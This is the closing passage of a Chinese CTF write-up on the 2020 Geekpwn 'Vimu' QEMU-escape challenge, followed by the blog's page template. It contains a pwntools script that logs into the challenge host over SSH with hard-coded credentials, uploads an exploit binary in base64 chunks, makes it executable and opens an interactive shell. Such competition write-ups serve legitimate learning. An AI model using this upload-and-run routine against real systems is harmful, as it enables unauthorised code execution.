+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> commands</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">"110.80.136.39"</span></span><br><span class="line">PORT =  <span class="number">22</span></span><br><span class="line"></span><br><span class="line">USER = <span class="string">"pwnvimu"</span></span><br><span class="line">PW = <span class="string">"pwnvimu2002"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exec_cmd</span><span class="params">(cmd)</span>:</span></span><br><span class="line">    r.sendline(cmd)</span><br><span class="line">    r.recvuntil(<span class="string">"/ # "</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload</span><span class="params">()</span>:</span></span><br><span class="line">    p = log.progress(<span class="string">"Upload"</span>)</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">"myexp"</span>,<span class="string">"rb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line">        </span><br><span class="line">    encoded = base64.b64encode(data)</span><br><span class="line">    r.recvuntil(<span class="string">"/ # "</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(encoded),<span class="number">1000</span>):</span><br><span class="line">        p.status(<span class="string">"%d / %d"</span> % (i,len(encoded)))</span><br><span class="line">        exec_cmd(<span class="string">"echo \"%s\" &gt;&gt; benc"</span> % (encoded[i:i+<span class="number">1000</span>]))</span><br><span class="line">        </span><br><span class="line">    exec_cmd(<span class="string">"cat ./benc | base64 -d &gt; ./bout"</span>)</span><br><span class="line">    exec_cmd(<span class="string">"chmod +x ./bout"</span>)</span><br><span class="line">    log.success(<span class="string">"success"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">(r)</span>:</span></span><br><span class="line">    upload()</span><br><span class="line">    r.interactive()</span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">if</span> local != <span class="number">1</span>:</span><br><span class="line">        session = ssh(USER, HOST, PORT, PW)</span><br><span class="line">        r = session.run(<span class="string">"/bin/sh"</span>)</span><br><span class="line">        exploit(r)</span><br></pre></td></tr></table></figure>
+<h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>做完以后回头看，是不是你也觉得这道题没有这么难，只是细节比较多。</p>
+<p>目前我个人遇到的<code>qemu</code>设备方面的逃逸大体分为两种，一种是写了个自定义设备，然后存在漏洞，另一种是更改了其原有的设备，需要我们对比源码与寻找漏洞，且一般来说第二种难度会更大一点（当然并不意味着第一种就会很简单），<code>Kimu</code>貌似是属于第二种？</p>
+<p>这是我第一次在比赛中做出<code>qemu-escape</code>，比较开心，但是路还很长，需倍加努力。</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>打赏还是打残，这是个问题</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>打赏</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/weichat.png" alt=" 微信支付">
+        <p>微信支付</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="/images/alipay.jpg" alt=" 支付宝">
+        <p>支付宝</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者：</strong>
+    
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://xiaoxiaorenwu.top/2020/07/23/2020Geekpwn_极限逃逸Vimu_解题过程分析/" title="2020Geekpwn_极限逃逸Vimu_解题过程分析">https://xiaoxiaorenwu.top/2020/07/23/2020Geekpwn_极限逃逸Vimu_解题过程分析/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>
+    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Qemu逃逸/" rel="tag"><i class="fa fa-tag"></i> Qemu逃逸</a>
+          
+            <a href="/tags/RealWorld/" rel="tag"><i class="fa fa-tag"></i> RealWorld</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/07/20/2020TCTF2020Geekpwn部分题解/" rel="next" title="2020TCTF/2020Geekpwn部分题解">
+                <i class="fa fa-chevron-left"></i> 2020TCTF/2020Geekpwn部分题解
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/08/01/Qemu学习—虚拟化初探/" rel="prev" title="Qemu学习-虚拟化初探">
+                Qemu学习-虚拟化初探 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+    </div>
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/xxrw.jpg" alt="">
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description">Babypwner@Dubhe@BUPT</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">53</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">9</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">24</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/xiaoxiaorenwu" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:renwuxiaoxiao@126.com" target="_blank" title="E-mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                大佬们的blog~~
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://p4nda.top" title="p4nda" target="_blank">p4nda</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://sunichi.github.io/" title="sunichi" target="_blank">sunichi</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://e3pem.github.io/" title="e3pem" target="_blank">e3pem</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://p1umer.github.io/" title="P1umer" target="_blank">P1umer</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://hpasserby.me/" title="hpasserby" target="_blank">hpasserby</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://ama2in9.top/" title="ama2in9" target="_blank">ama2in9</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://t3ls.club/" title="T3LS" target="_blank">T3LS</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.pwn4fun.com/" title="Railgun" target="_blank">Railgun</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Vimu"><span class="nav-number">1.</span> <span class="nav-text">Vimu</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#解题过程"><span class="nav-number">1.2.</span> <span class="nav-text">解题过程</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#环境配置"><span class="nav-number">1.2.1.</span> <span class="nav-text">环境配置</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#逆向"><span class="nav-number">1.2.2.</span> <span class="nav-text">逆向</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#函数与漏洞分析"><span class="nav-number">1.2.3.</span> <span class="nav-text">函数与漏洞分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#利用"><span class="nav-number">1.2.4.</span> <span class="nav-text">利用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#leak"><span class="nav-number">1.2.4.1.</span> <span class="nav-text">leak</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#思路一"><span class="nav-number">1.2.4.1.1.</span> <span class="nav-text">思路一</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#思路二"><span class="nav-number">1.2.4.1.2.</span> <span class="nav-text">思路二</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#思路三"><span class="nav-number">1.2.4.1.3.</span> <span class="nav-text">思路三</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#思路四"><span class="nav-number">1.2.4.1.4.</span> <span class="nav-text">思路四</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#突破"><span class="nav-number">1.2.4.1.5.</span> <span class="nav-text">突破</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#hijack"><span class="nav-number">1.2.4.2.</span> <span class="nav-text">hijack</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#exp"><span class="nav-number">1.2.4.3.</span> <span class="nav-text">exp</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#upload"><span class="nav-number">1.2.4.4.</span> <span class="nav-text">upload</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#结语"><span class="nav-number">1.3.</span> <span class="nav-text">结语</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+        <div class="back-to-top">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder"></span>
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+  </script>
+  
+    <span class="site-uv">
+      访客数
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      人
+    </span>
+  
+
+  
+    <span class="site-pv">
+      总访问量
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      次
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  <script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+  
+  <script type="text/javascript">
+    var GUEST = ['nick','mail','link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item=>{
+      return GUEST.indexOf(item)>-1;
+    });
+    new Valine({
+        el: '#comments' ,
+        verify: false,
+        notify: false,
+        appId: 'wQR3fxNYiFB3Sh2MdPvjK8ez-gzGzoHsz',
+        appKey: 'M81KRpr3NUHCSrwBJ9TY73HF',
+        placeholder: '欢乐时光就要开始了',
+        avatar:'mm',
+        guest_info:guest,
+        pageSize:'10' || 10,
+    });
+  </script>
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+
+
+   <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;"></canvas> 
+   <script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+   <script type="text/javascript" src="/js/src/fireworks.js"></script>
+
+<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
+
+<!-- ҳ����С���� -->
+<script type="text/javascript" src="/js/src/clicklove.js"></script>
+
